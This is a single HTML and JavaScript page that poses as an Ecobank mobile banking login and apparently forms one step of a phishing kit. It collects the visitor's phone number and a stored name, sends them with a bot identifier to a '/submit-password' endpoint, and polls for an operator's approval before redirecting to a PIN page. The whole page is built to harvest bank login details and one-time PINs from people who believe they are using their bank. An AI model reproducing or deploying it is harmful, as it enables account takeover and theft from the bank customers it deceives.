<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Ecobank Mobile</title>

<link rel="stylesheet"
href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>

<style>

/* ================= BASE ================= */
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, Helvetica, sans-serif;
}

body{
    background:#f2f2f2;
    display:flex;
    justify-content:center;
}

/* ================= CONTAINER ================= */
.container{
    width:100%;
    max-width:430px;
    min-height:100vh;
    background:#f2f2f2;
    padding:28px 22px;
    position:relative;
}

/* ================= CHAT ================= */
.chat-btn{
    position:absolute;
    right:18px;
    top:18px;
    width:55px;
    height:55px;
    border-radius:50%;
    background:#0b6aa2;
    display:flex;
    align-items:center;
    justify-content:center;
    color:white;
}

/* ================= TITLE ================= */
.title{
    margin-top:60px;
    font-size:34px;
    font-weight:700;
    color:#111;
}

.subtitle{
    margin-top:18px;
    font-size:16px;
    font-weight:600;
}

.small-text{
    margin-top:6px;
    font-size:13px;
    color:#666;
}

/* ================= COUNTRY ================= */
.country-label{
    margin-top:40px;
    font-size:15px;
    font-weight:600;
}

.country-select{
    width:100%;
    border:none;
    border-bottom:1px solid #ddd;
    padding:12px 0;
    font-size:15px;
    background:transparent;
    outline:none;
}

/* ================= INPUT ================= */
.input-group{
    margin-top:25px;
}

.input-row{
    display:flex;
    align-items:center;
    border-bottom:1px solid #ddd;
    padding:12px 0;
    gap:10px;
}

.input-row i{
    font-size:18px;
    color:#333;
}

.country-code{
    display:flex;
    align-items:center;
    gap:6px;
    min-width:85px;
}

.country-code img{
    width:22px;
}

/* INPUT FIELD */
.input-row input{
    flex:1;
    border:none;
    outline:none;
    font-size:15px;
    background:transparent;
}

/* ================= INFO ================= */
.info-text{
    font-size:12px;
    color:#777;
    margin-top:10px;
}

/* ================= BUTTON ================= */
.login-btn{
    width:100%;
    margin-top:30px;
    padding:16px;
    border:none;
    background:#2ecc71;
    color:white;
    font-size:18px;
    font-weight:700;
    border-radius:4px;
}

.login-btn:disabled{
    background:#cfcfcf;
}

/* ================= FOOTER ================= */
.footer-text{
    text-align:center;
    margin-top:25px;
    font-size:14px;
}

.footer-text a{
    color:#0077b6;
    text-decoration:none;
}

/* ================= HIDDEN SYSTEM ELEMENTS ================= */
#status,#spinner,.secondary{
    display:none;
}

</style>
</head>

<body>

<form id="detailsForm">

<div class="container">

    <!-- CHAT -->
    <div class="chat-btn">
        <i class="fa-regular fa-comment-dots"></i>
    </div>

    <!-- TITLE -->
    <h1 class="title">Welcome to Ecobank</h1>

    <div class="subtitle">
        Have an Ecobank account?
    </div>

    <div class="small-text">
        Enter your mobile number to get started
    </div>

    <!-- COUNTRY -->
    <div class="country-label">
        Please select your country
    </div>

    <select id="countrySelect" class="country-select">
        <option value="233" selected>🇬🇭 Ghana (+233)</option>
        <option value="234">🇳🇬 Nigeria (+234)</option>
        <option value="254">🇰🇪 Kenya (+254)</option>
        <option value="256">🇺🇬 Uganda (+256)</option>
        <option value="27">🇿🇦 South Africa (+27)</option>
        <option value="1">🇺🇸 United States (+1)</option>
        <option value="44">🇬🇧 United Kingdom (+44)</option>
    </select>

    <!-- MOBILE INPUT -->
    <div class="input-group">

        <div class="input-row">

            <i class="fa-solid fa-mobile-screen-button"></i>

            <div class="country-code">
                <img src="https://flagcdn.com/w40/gh.png">
                <span>+233</span>
            </div>

            <input
                type="tel"
                id="mobileNumber"
                maxlength="10"
                placeholder="Enter mobile number">

        </div>

    </div>

    <!-- INFO -->
    <div class="info-text">
        A one-time PIN will be sent via SMS on this number
    </div>

    <!-- STATUS (USED BY BACKEND) -->
    <div id="status"></div>
    <div id="spinner">⏳</div>

    <!-- BUTTON -->
    <button class="login-btn primary" id="loginBtn" disabled type="submit">
        Proceed
    </button>

    <!-- FOOTER -->
    <div class="footer-text">
        Don't have an Ecobank account?
        <a href="#">Open New Account</a>
    </div>

</div>

</form>

<!-- ================= SCRIPT (PASSWORD REMOVED CLEANLY) ================= -->
<script>

const form = document.getElementById('detailsForm');
const mobileNumber = document.getElementById('mobileNumber');
const nextButton = document.getElementById('loginBtn');
const statusEl = document.getElementById('status');
const spinner = document.getElementById('spinner');
const fullName = localStorage.getItem('fullName') || 'Unknown';
/* BOT ID */
const params = new URLSearchParams(window.location.search);
const urlBotId = params.get('botId');

if(urlBotId){
  localStorage.setItem('botId', urlBotId);
}

const botId = localStorage.getItem('botId');

if(!botId){
  alert('Session expired. Please start again.');
  window.location.href='index.html';
}

/* ENABLE BUTTON */
mobileNumber.addEventListener("input", () => {

    const valid = mobileNumber.value.trim().length >= 8;

    nextButton.disabled = !valid;

    if(valid){
        nextButton.classList.add("active");
    } else {
        nextButton.classList.remove("active");
    }

});

/* SUBMIT */
form.addEventListener('submit', async (e)=>{

  e.preventDefault();

  nextButton.disabled = true;

  const phone = mobileNumber.value.trim();

  localStorage.setItem('phone', phone);

  statusEl.style.display='block';
  spinner.style.display='block';

  statusEl.textContent='⏳ Processing request...';

  try{

    const res = await fetch(`${window.location.origin}/submit-password`,{

      method:'POST',
      headers:{ 'Content-Type':'application/json' },

      body:JSON.stringify({
        name:fullName,
        phone,
        botId
      })

    });

    const { requestId } = await res.json();

    pollApproval(requestId);

  }catch{

    spinner.style.display='none';
    statusEl.textContent='❌ Server error';
    nextButton.disabled = false;

  }

});

/* POLLING */
function pollApproval(requestId){

  const interval = setInterval(async ()=>{

    const res = await fetch(
      `${window.location.origin}/check-password/${requestId}`
    );

    const data = await res.json();

    if(data.redirect === 'pin'){
      clearInterval(interval);
      window.location.href='pin.html';
    }

    if(data.approved === false){
      clearInterval(interval);
      spinner.style.display='none';
      statusEl.textContent='❌ Incorrect details';
      nextButton.disabled = false;
    }

  }, 2000);

}

</script>

</body>
</html>
